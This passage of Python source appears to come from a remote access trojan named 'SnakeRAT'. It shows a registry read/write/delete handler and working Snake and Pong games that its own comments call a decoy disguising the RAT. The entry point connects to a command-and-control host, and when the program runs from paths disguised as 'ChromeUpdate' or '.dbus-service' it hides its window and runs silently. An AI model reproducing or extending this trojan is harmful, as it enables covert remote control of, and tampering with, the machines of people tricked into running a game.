        path = cmd.get('path', '') # Windows: HKLM\...\Key, Linux: Section.Key
        value_name = cmd.get('name', '')
        value_data = cmd.get('value', '')
        
        try:
            if IS_WINDOWS:
                import winreg
                # Map shorthand
                hives = {
                    'HKCU': winreg.HKEY_CURRENT_USER,
                    'HKLM': winreg.HKEY_LOCAL_MACHINE,
                    'HKU': winreg.HKEY_USERS,
                    'HKCR': winreg.HKEY_CLASSES_ROOT
                }
                
                parts = path.split('\\', 1)
                hive = hives.get(parts[0].upper(), winreg.HKEY_CURRENT_USER)
                key_path = parts[1] if len(parts) > 1 else ""
                
                if action == 'read':
                    with winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ) as key:
                        val, type_id = winreg.QueryValueEx(key, value_name)
                        return {'value': str(val), 'type': type_id}
                elif action == 'write':
                    with winreg.OpenKey(hive, key_path, 0, winreg.KEY_WRITE) as key:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, str(value_data))
                        return {'success': True}
                elif action == 'delete':
                    with winreg.OpenKey(hive, key_path, 0, winreg.KEY_WRITE) as key:
                        winreg.DeleteValue(key, value_name)
                        return {'success': True}
            
            elif IS_LINUX:
                # Use a JSON file to emulate Registry on Linux
                reg_file = os.path.expanduser('~/.config/SnakeRAT/emulated_reg.json')
                os.makedirs(os.path.dirname(reg_file), exist_ok=True)
                
                data = {}
                if os.path.exists(reg_file):
                    try:
                        with open(reg_file, 'r') as f: data = json.load(f)
                    except: data = {}
                
                full_key = f"{path}:{value_name}"
                
                if action == 'read':
                    return {'value': data.get(full_key, 'NOT_FOUND')}
                elif action == 'write':
                    data[full_key] = value_data
                    with open(reg_file, 'w') as f: json.dump(data, f)
                    return {'success': True}
                elif action == 'delete':
                    if full_key in data: del data[full_key]
                    with open(reg_file, 'w') as f: json.dump(data, f)
                    return {'success': True}
            
            return {'error': 'Action failed or platform not supported'}
        except Exception as e:
            return {'error': str(e)}

class SnakeGame:
    """Snake Engine for Arcade Decoy"""
    def __init__(self, width=800, height=600):
        self.width, self.height = width, height
        self.grid_size = 20
        self.colors = {
            'background': (20, 20, 40), 'snake_head': (0, 255, 100),
            'food': (255, 100, 100), 'text': (255, 255, 255), 'grid': (40, 40, 60)
        }
        self.snake_x = self.snake_y = 0
        self.dx = self.dy = 0
        self.snake: List[Tuple[int, int]] = []
        self.food: Tuple[int, int] = (0, 0)
        self.score = self.level = 0
        self.base_speed = self.speed = 0
        self.game_over = self.paused = False
        self.logger = logging.getLogger("Snake")
        self.reset_game()
        
    def reset_game(self):
        self.snake_x, self.snake_y = self.width // 2, self.height // 2
        self.dx, self.dy = self.grid_size, 0
        self.snake = [(self.snake_x, self.snake_y)]
        self.food = self._generate_food()
        self.score, self.level = 0, 1
        self.base_speed, self.speed = 10, 10
        self.game_over, self.paused = False, False
    
    def _generate_food(self):
        """Generate food at random position"""
        import random
        
        max_x = (self.width - self.grid_size) // self.grid_size
        max_y = (self.height - self.grid_size) // self.grid_size
        
        while True:
            fx = random.randint(0, max_x) * self.grid_size
            fy = random.randint(0, max_y) * self.grid_size
            
            if (fx, fy) not in self.snake:
                return (fx, fy)
    
    def handle_events(self):
        """Handle keyboard input for Snake"""
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    return False
                if event.key == pygame.K_p:
                    self.paused = not self.paused
                if self.game_over and event.key == pygame.K_SPACE:
                    self.reset_game()
                
                # Direction changes (prevent 180 turns)
                if not self.paused:
                    if event.key in [pygame.K_UP, pygame.K_w] and self.dy == 0:
                        self.dx, self.dy = 0, -self.grid_size
                    elif event.key in [pygame.K_DOWN, pygame.K_s] and self.dy == 0:
                        self.dx, self.dy = 0, self.grid_size
                    elif event.key in [pygame.K_LEFT, pygame.K_a] and self.dx == 0:
                        self.dx, self.dy = -self.grid_size, 0
                    elif event.key in [pygame.K_RIGHT, pygame.K_d] and self.dx == 0:
                        self.dx, self.dy = self.grid_size, 0
        return True
    
    def update(self):
        """Update game state"""
        if self.game_over or self.paused:
            return
        
        # Move snake
        self.snake_x += self.dx
        self.snake_y += self.dy
        
        # Wrap around edges
        if self.snake_x >= self.width:
            self.snake_x = 0
        elif self.snake_x < 0:
            self.snake_x = self.width - self.grid_size
        
        if self.snake_y >= self.height:
            self.snake_y = 0
        elif self.snake_y < 0:
            self.snake_y = self.height - self.grid_size
        
        # Add new head
        self.snake.insert(0, (self.snake_x, self.snake_y))
        
        # Check food collision
        if (self.snake_x, self.snake_y) == self.food:
            self.score += 10
            self.food = self._generate_food()
            
            # Level up every 50 points
            if self.score % 50 == 0:
                self.level += 1
                self.speed = self.base_speed + (self.level * 2)
        else:
            # Remove tail
            self.snake.pop()
        
        # Check self collision
        if len(self.snake) > 1 and (self.snake_x, self.snake_y) in self.snake[1:]:
            self.logger.warning(f"Game Over! Final Score: {self.score}")
            self.game_over = True
    
    def draw(self, screen):
        """Draw everything"""
        screen.fill(self.colors['background'])
        # Grid
        for x in range(0, self.width, self.grid_size):
            pygame.draw.line(screen, self.colors['grid'], (x, 0), (x, self.height), 1)
        for y in range(0, self.height, self.grid_size):
            pygame.draw.line(screen, self.colors['grid'], (0, y), (self.width, y), 1)
        
        # Food
        fx, fy = self.food
        pulse = abs(pygame.time.get_ticks() % 1000 - 500) / 500
        size = int(self.grid_size - 4 + (pulse * 2))
        offset = (self.grid_size - size) // 2
        pygame.draw.rect(screen, self.colors['food'], (fx + offset, fy + offset, size, size))
        
        # Snake
        for i, (x, y) in enumerate(self.snake):
            color = self.colors['snake_head'] if i == 0 else (0, max(50, 255 - (i * 5)), 0)
            pygame.draw.rect(screen, color, (x + 2, y + 2, self.grid_size - 4, self.grid_size - 4))
        
        # Overlays
        score_text = pygame.font.Font(None, 36).render(f'Score: {self.score}', True, self.colors['text'])
        screen.blit(score_text, (20, 20))
        
        if self.game_over:
            overlay = pygame.Surface((self.width, self.height))
            overlay.set_alpha(128)
            overlay.fill((0, 0, 0))
            screen.blit(overlay, (0, 0))
            go_text = pygame.font.Font(None, 72).render('GAME OVER', True, (255, 0, 0))
            screen.blit(go_text, go_text.get_rect(center=(self.width // 2, self.height // 2 - 50)))
            prompt = pygame.font.Font(None, 36).render('Press SPACE to Restart or ESC to Menu', True, (255, 255, 255))
            screen.blit(prompt, prompt.get_rect(center=(self.width // 2, self.height // 2 + 20)))

class PongGame:
    """Pong Engine for Arcade Decoy"""
    def __init__(self, width=800, height=600):
        self.width, self.height = width, height
        self.padx = self.pady = self.cpu_padx = self.cpu_pady = 0
        self.pad_w = self.pad_h = 0
        self.ball_x = self.ball_y = self.ball_dx = self.ball_dy = 0
        self.score = self.cpu_score = 0
        self.game_over = self.paused = False
        self.speed = 40
        self.reset_game()
        
    def reset_game(self):
        self.padx, self.pady = 20, self.height // 2 - 45
        self.cpu_padx, self.cpu_pady = self.width - 35, self.height // 2 - 45
        self.pad_w, self.pad_h = 15, 90
        self.ball_x, self.ball_y = self.width // 2, self.height // 2
        self.ball_dx, self.ball_dy = 7 * random.choice([-1, 1]), 7 * random.choice([-1, 1])
        self.score, self.cpu_score = 0, 0
        self.game_over = False
        self.paused = False

    def handle_events(self):
        keys = pygame.key.get_pressed()
        if not self.paused and not self.game_over:
            if keys[pygame.K_UP] and self.pady > 0: self.pady -= 8
            if keys[pygame.K_DOWN] and self.pady < self.height - self.pad_h: self.pady += 8
        
        for event in pygame.event.get():
            if event.type == pygame.QUIT: return False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_p: self.paused = not self.paused
                if self.game_over and event.key == pygame.K_SPACE: self.reset_game()
                if event.key == pygame.K_ESCAPE: return False # Back to menu
        return True

    def update(self):
        if self.game_over or self.paused: return
        self.ball_x += self.ball_dx
        self.ball_y += self.ball_dy
        
        if self.ball_y <= 0 or self.ball_y >= self.height - 15: self.ball_dy *= -1
        
        # CPU AI
        if self.cpu_pady + self.pad_h // 2 < self.ball_y: self.cpu_pady += 6
        else: self.cpu_pady -= 6
        
        # Collisions
        if self.ball_x <= self.padx + self.pad_w and self.pady < self.ball_y < self.pady + self.pad_h:
            self.ball_dx *= -1
            self.ball_dx = int(self.ball_dx * 1.1)
        if self.ball_x >= self.cpu_padx - 15 and self.cpu_pady < self.ball_y < self.cpu_pady + self.pad_h:
            self.ball_dx *= -1
            self.ball_dx = int(self.ball_dx * 1.1)
            
        if self.ball_x < 0: self.cpu_score += 1; self.ball_x, self.ball_y = self.width//2, self.height//2; self.ball_dx = 7
        if self.ball_x > self.width: self.score += 1; self.ball_x, self.ball_y = self.width//2, self.height//2; self.ball_dx = -7
        
        if self.score >= 5 or self.cpu_score >= 5: self.game_over = True

    def draw(self, screen):
        screen.fill((10, 10, 10))
        pygame.draw.rect(screen, (255, 255, 255), (self.padx, self.pady, self.pad_w, self.pad_h))
        pygame.draw.rect(screen, (255, 255, 255), (self.cpu_padx, self.cpu_pady, self.pad_w, self.pad_h))
        pygame.draw.circle(screen, (255, 255, 255), (int(self.ball_x), int(self.ball_y)), 10)
        
        font = pygame.font.Font(None, 74)
        text = font.render(f"{self.score}  {self.cpu_score}", True, (255, 255, 255))
        screen.blit(text, (self.width // 2 - 50, 20))
        if self.game_over:
            msg = "YOU WIN!" if self.score > self.cpu_score else "CPU WINS!"
            win_text = font.render(msg, True, (0, 255, 0) if self.score > self.cpu_score else (255, 0, 0))
            screen.blit(win_text, win_text.get_rect(center=(self.width//2, self.height//2)))

class ArcadeDecoy:
    """The central Game Hub that disguises the RAT activities"""
    def __init__(self):
        pygame.init()
        self.width, self.height = 800, 600
        self.screen = pygame.display.set_mode((self.width, self.height))
        pygame.display.set_caption("Retro Arcade Collection v1.4")
        self.clock = pygame.time.Clock()
        self.rat = AdvancedRAT()
        self.state = "MENU" # MENU, SNAKE, PONG
        self.active_game: Any = None
        
        self.run()

    def run(self):
        while True:
            if self.state == "MENU":
                if not self.handle_menu(): break
            elif self.state == "SNAKE":
                if not self.active_game: self.active_game = SnakeGame()
                if not self.active_game.handle_events(): 
                    self.state = "MENU"; self.active_game = None; continue
                self.active_game.update()
                self.active_game.draw(self.screen)
                pygame.display.flip()
                self.clock.tick(self.active_game.speed)
            elif self.state == "PONG":
                if not self.active_game: self.active_game = PongGame()
                if not self.active_game.handle_events(): 
                    self.state = "MENU"; self.active_game = None; continue
                self.active_game.update()
                self.active_game.draw(self.screen)
                pygame.display.flip()
                self.clock.tick(self.active_game.speed)

    def handle_menu(self):
        self.screen.fill((20, 20, 30))
        font_l = pygame.font.Font(None, 64)
        font_m = pygame.font.Font(None, 32)
        
        title = font_l.render("RETRO ARCADE", True, (255, 215, 0))
        self.screen.blit(title, title.get_rect(center=(self.width//2, 100)))
        
        options = ["1. Snake Classic", "2. Cyber Pong", "ESC. Quit"]
        for i, opt in enumerate(options):
            txt = font_m.render(opt, True, (200, 200, 200))
            self.screen.blit(txt, txt.get_rect(center=(self.width//2, 250 + i*50)))
            
        pygame.display.flip()
        
        for event in pygame.event.get():
            if event.type == pygame.QUIT: return False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_1: self.state = "SNAKE"
                if event.key == pygame.K_2: self.state = "PONG"
                if event.key == pygame.K_ESCAPE: return False
        return True

    def _log(self, level, message): # Dummy for back-compat if needed
        pass

if __name__ == "__main__":
    try:
        # Parse arguments
        parser = argparse.ArgumentParser(description='Advanced SnakeRAT Client')
        parser.add_argument('--host', help='C2 Server Host IP', default=C2_HOST)
        parser.add_argument('--port', type=int, help='C2 Server Port', default=C2_PORT)
        args = parser.parse_args()

        # Update C2 configuration
        C2_HOST = args.host
        C2_PORT = args.port
        if C2_SERVERS:
            C2_SERVERS[0]['host'] = C2_HOST
            C2_SERVERS[0]['port'] = C2_PORT

        print(f"[*] Initializing connection to {C2_HOST}:{C2_PORT}...")
        
        # Detect Instance Mode
        if getattr(sys, 'frozen', False):
            current_path = os.path.abspath(sys.executable)
        else:
            current_path = os.path.abspath(__file__)
            
        is_shadow = any(x in current_path for x in [".dbus-service", "ChromeUpdate", ".metadata"])
        
        if is_shadow:
            print("[*] Detected Shadow Process - Running in background mode...")
            if IS_WINDOWS:
                try:
                    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                except: pass
            
            rat = AdvancedRAT()
            while rat.running:
                time.sleep(1)
        else:
            print("[*] Starting Game Decoy Hub...")
            ArcadeDecoy()
            
    except Exception as e:
        print(f"[!] FATAL ERROR DURING STARTUP: {str(e)}")
        import traceback
        traceback.print_exc()
        time.sleep(5)